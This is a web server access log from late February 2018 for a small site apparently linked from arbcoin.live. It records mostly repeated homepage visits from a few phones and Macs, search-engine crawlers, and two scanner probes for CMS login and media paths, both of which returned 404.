49.98.148.204 - - [26/Feb/2018:12:59:58 +0000] "GET / HTTP/1.1" 200 1713 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:13:21:50 +0000] "GET / HTTP/1.1" 200 1764 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:13:21:51 +0000] "GET / HTTP/1.1" 200 1762 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:13:23:44 +0000] "GET / HTTP/1.1" 200 1747 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:13:23:44 +0000] "GET / HTTP/1.1" 200 1750 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:13:23:51 +0000] "GET / HTTP/1.1" 200 1750 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:13:23:51 +0000] "GET / HTTP/1.1" 200 1736 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:13:28:37 +0000] "GET / HTTP/1.1" 200 1746 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:13:28:37 +0000] "GET / HTTP/1.1" 200 1743 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:08:49 +0000] "GET / HTTP/1.1" 200 1748 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:08:49 +0000] "GET / HTTP/1.1" 200 1737 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:11:51 +0000] "GET / HTTP/1.1" 200 1748 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:11:51 +0000] "GET / HTTP/1.1" 200 1750 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:13:26 +0000] "GET / HTTP/1.1" 200 1733 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:13:26 +0000] "GET / HTTP/1.1" 200 1734 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:14:25 +0000] "GET / HTTP/1.1" 200 1755 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:14:25 +0000] "GET / HTTP/1.1" 200 1754 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:19:34 +0000] "GET / HTTP/1.1" 200 1756 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:19:34 +0000] "GET / HTTP/1.1" 200 1756 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
77.75.79.36 - - [26/Feb/2018:14:21:58 +0000] "GET / HTTP/1.1" 200 1743 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
49.98.148.204 - - [26/Feb/2018:14:32:32 +0000] "GET / HTTP/1.1" 200 1738 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:32:32 +0000] "GET / HTTP/1.1" 200 1739 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:52:19 +0000] "GET / HTTP/1.1" 200 1723 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:52:19 +0000] "GET / HTTP/1.1" 200 1718 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:54:56 +0000] "GET / HTTP/1.1" 200 1730 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [26/Feb/2018:14:54:56 +0000] "GET / HTTP/1.1" 200 1748 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [26/Feb/2018:15:17:32 +0000] "GET / HTTP/1.1" 200 1719 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
113.147.67.193 - - [26/Feb/2018:15:17:40 +0000] "GET / HTTP/1.1" 200 1728 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
113.147.67.193 - - [26/Feb/2018:15:27:17 +0000] "GET / HTTP/1.1" 200 1748 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
14.215.176.5 - - [26/Feb/2018:15:28:20 +0000] "GET / HTTP/1.1" 200 1746 "http://www.baidu.com/s?wd=SQS" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
113.147.67.193 - - [26/Feb/2018:15:52:37 +0000] "GET / HTTP/1.1" 200 1748 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
113.147.67.193 - - [26/Feb/2018:16:02:29 +0000] "GET / HTTP/1.1" 200 1755 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [26/Feb/2018:16:04:22 +0000] "GET / HTTP/1.1" 200 1756 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [26/Feb/2018:16:07:57 +0000] "GET / HTTP/1.1" 200 1741 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
113.147.67.193 - - [26/Feb/2018:16:10:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [26/Feb/2018:16:16:08 +0000] "GET / HTTP/1.1" 200 1737 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [26/Feb/2018:16:18:43 +0000] "GET / HTTP/1.1" 200 1738 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
113.147.67.193 - - [26/Feb/2018:16:32:59 +0000] "GET / HTTP/1.1" 200 1734 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [26/Feb/2018:16:37:45 +0000] "GET / HTTP/1.1" 200 1748 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [26/Feb/2018:16:37:53 +0000] "GET / HTTP/1.1" 200 1743 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
137.74.92.77 - - [26/Feb/2018:16:38:13 +0000] "GET / HTTP/1.1" 200 1749 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
113.147.67.193 - - [26/Feb/2018:16:49:54 +0000] "GET / HTTP/1.1" 200 1736 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
113.147.67.193 - - [26/Feb/2018:16:50:23 +0000] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [26/Feb/2018:17:07:21 +0000] "GET / HTTP/1.1" 200 1745 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
66.249.79.86 - - [26/Feb/2018:21:42:27 +0000] "GET / HTTP/1.1" 200 1733 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
113.147.67.193 - - [26/Feb/2018:23:56:55 +0000] "GET / HTTP/1.1" 200 1732 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [26/Feb/2018:23:56:55 +0000] "GET / HTTP/1.1" 200 1732 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [27/Feb/2018:00:06:00 +0000] "GET / HTTP/1.1" 200 1735 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [27/Feb/2018:00:06:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
45.55.242.204 - - [27/Feb/2018:00:14:29 +0000] "GET / HTTP/1.1" 200 1734 "http://arbcoin.live" "Mozilla/5.0 (compatible; DnyzBot/1.0)"
113.147.67.193 - - [27/Feb/2018:00:20:30 +0000] "GET / HTTP/1.1" 200 1730 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [27/Feb/2018:00:20:30 +0000] "GET / HTTP/1.1" 200 1734 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [27/Feb/2018:00:22:03 +0000] "GET / HTTP/1.1" 200 1724 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [27/Feb/2018:00:22:03 +0000] "GET / HTTP/1.1" 200 1730 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [27/Feb/2018:00:42:33 +0000] "GET / HTTP/1.1" 200 1746 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
113.147.67.193 - - [27/Feb/2018:00:42:43 +0000] "GET / HTTP/1.1" 200 1732 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
113.147.67.193 - - [27/Feb/2018:01:00:34 +0000] "GET / HTTP/1.1" 200 1734 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
14.215.176.15 - - [27/Feb/2018:01:00:56 +0000] "GET / HTTP/1.1" 200 1736 "http://www.baidu.com/s?wd=QW7" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
113.147.67.193 - - [27/Feb/2018:01:01:01 +0000] "GET / HTTP/1.1" 200 1738 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [27/Feb/2018:01:05:01 +0000] "GET / HTTP/1.1" 200 1750 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
49.98.148.204 - - [27/Feb/2018:02:05:20 +0000] "GET / HTTP/1.1" 200 1741 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [27/Feb/2018:02:05:22 +0000] "GET / HTTP/1.1" 200 1749 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [27/Feb/2018:02:08:21 +0000] "GET / HTTP/1.1" 200 1763 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [27/Feb/2018:02:08:21 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
49.98.148.204 - - [27/Feb/2018:02:08:21 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
49.98.148.204 - - [27/Feb/2018:02:08:21 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
49.98.148.204 - - [27/Feb/2018:02:08:21 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
95.221.250.243 - - [27/Feb/2018:02:33:10 +0000] "GET / HTTP/1.1" 200 1726 "http://yandex.ru/clck/jsredir?from=yandex.ru%3Bsearch%3Bweb%3B%3B&text=&etext=1709.RBsSGapoTUd-RwNlVt7HXuPIXmbxnpdhhQwgBUfrAQz6PSr9z--zJn1CQl84yMU5.ae4c78b39161c5682e0ef3f57c175e2a693a7a29&uuid=&state=_BLhILn4SxNIvvL0W45KSic66uCIg23qh8iRG98qeIXmeppkgUc0YD4hgzqAYr5iuWBiLZQy-rY&data=UlNrNmk5WktYejR0eWJFYk1LdmtxcnJDNi1SSUFFNGlPZUVjVWlmMU1RdVNkMzcwbXBfbG40MC1BWlE1emJxSlVxcVR2WUdEVmlHV243T2hhVlJUZXVpU2czQmVuLTMx&b64e=2&sign=a0c86224e2f920e1906d357d660d2e5d&keyno=0&cst=AiuY0DBWFJ7IXge4WdYJQe3IrxbPWIv4-i3OQ9b1Eo3HKSQ57-98H7voEoWUVqyqnUckMRLaUzHuCticMZLLy1L4goESR3_vpfoMKTcn7C78c633vRANCSDkdUJC36RD9LAIqWXk9DMAkelndlYYZ4-ACJglxl9T&ref=orjY4mGPRjk5boDnW0uvlrrd71vZw9kp5uQozpMtKCVwjJVQHb9Cs31LlKZ16-MuEGpTji7AZj5C9D7ErC3GxKgqOnwBBzmweU9dX6g5CIQa25xZWBarJw&l10n=ru&cts=1519692417697&mc=3.38100133949" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MASBJS)"
118.6.205.26 - - [27/Feb/2018:02:41:38 +0000] "GET / HTTP/1.1" 200 1757 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
165.227.116.45 - - [27/Feb/2018:03:13:29 +0000] "GET / HTTP/1.1" 200 1733 "-" "Mozilla/5.0 (compatible; DnyzBot/1.0) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/64.0.3264.0 Safari/537.36"
118.6.205.26 - - [27/Feb/2018:03:33:02 +0000] "GET / HTTP/1.1" 200 1745 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [27/Feb/2018:03:34:53 +0000] "GET / HTTP/1.1" 200 1729 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [27/Feb/2018:04:21:53 +0000] "GET / HTTP/1.1" 200 1750 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [27/Feb/2018:04:40:59 +0000] "GET / HTTP/1.1" 200 1717 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [27/Feb/2018:04:43:07 +0000] "GET / HTTP/1.1" 200 1723 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [27/Feb/2018:04:44:05 +0000] "GET / HTTP/1.1" 200 1731 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [27/Feb/2018:04:55:13 +0000] "GET / HTTP/1.1" 200 1719 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [27/Feb/2018:05:36:19 +0000] "GET / HTTP/1.1" 200 1722 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [27/Feb/2018:06:11:36 +0000] "GET / HTTP/1.1" 200 1733 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [27/Feb/2018:06:19:17 +0000] "GET / HTTP/1.1" 200 1735 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
23.236.77.20 - - [27/Feb/2018:06:42:46 +0000] "HEAD /dede/login.php HTTP/1.1" 404 0 "-" "-"
118.6.205.26 - - [27/Feb/2018:07:33:02 +0000] "GET / HTTP/1.1" 200 1727 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [27/Feb/2018:08:37:03 +0000] "GET / HTTP/1.1" 200 1732 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [27/Feb/2018:08:37:55 +0000] "GET / HTTP/1.1" 200 1713 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
49.106.188.59 - - [27/Feb/2018:09:28:43 +0000] "GET / HTTP/1.1" 200 1732 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.106.188.59 - - [27/Feb/2018:09:28:43 +0000] "GET / HTTP/1.1" 200 1728 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [27/Feb/2018:09:28:50 +0000] "GET / HTTP/1.1" 200 1746 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
49.98.148.204 - - [27/Feb/2018:09:28:50 +0000] "GET / HTTP/1.1" 200 1749 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.237.55 - - [27/Feb/2018:12:15:41 +0000] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.237.55 - - [27/Feb/2018:12:15:45 +0000] "GET / HTTP/1.1" 200 1736 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
115.215.217.63 - - [27/Feb/2018:12:48:03 +0000] "GET /index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author= HTTP/1.1" 404 746 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36"
115.215.217.63 - - [27/Feb/2018:12:48:07 +0000] "GET /index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author= HTTP/1.1" 404 746 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36"
113.147.67.193 - - [27/Feb/2018:13:12:36 +0000] "GET / HTTP/1.1" 200 1724 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [27/Feb/2018:13:14:16 +0000] "GET / HTTP/1.1" 200 1739 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [27/Feb/2018:13:18:00 +0000] "GET / HTTP/1.1" 200 1721 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [27/Feb/2018:14:35:05 +0000] "GET / HTTP/1.1" 200 1753 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [27/Feb/2018:14:46:44 +0000] "GET / HTTP/1.1" 200 1740 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [27/Feb/2018:14:46:56 +0000] "GET / HTTP/1.1" 200 1738 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [27/Feb/2018:15:06:12 +0000] "GET / HTTP/1.1" 200 1728 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [27/Feb/2018:15:07:04 +0000] "GET / HTTP/1.1" 200 1733 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [27/Feb/2018:15:09:01 +0000] "GET / HTTP/1.1" 200 1745 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
38.142.184.2 - - [27/Feb/2018:15:46:41 +0000] "GET / HTTP/1.1" 200 9287 "-" "-"
176.14.37.74 - - [27/Feb/2018:15:51:20 +0000] "GET / HTTP/1.1" 200 1751 "http://www.yandex.ru/" "Mozilla/5.0 (compatible; YandexAntivirus/2.0; +http://yandex.com/bots)"
35.195.56.139 - - [27/Feb/2018:16:04:14 +0000] "GET / HTTP/1.1" 200 9285 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
178.154.200.39 - - [27/Feb/2018:16:15:53 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
161.69.99.11 - - [27/Feb/2018:16:24:18 +0000] "GET / HTTP/1.1" 200 1750 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0"
161.69.99.11 - - [27/Feb/2018:16:27:29 +0000] "GET / HTTP/1.1" 200 1726 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0"
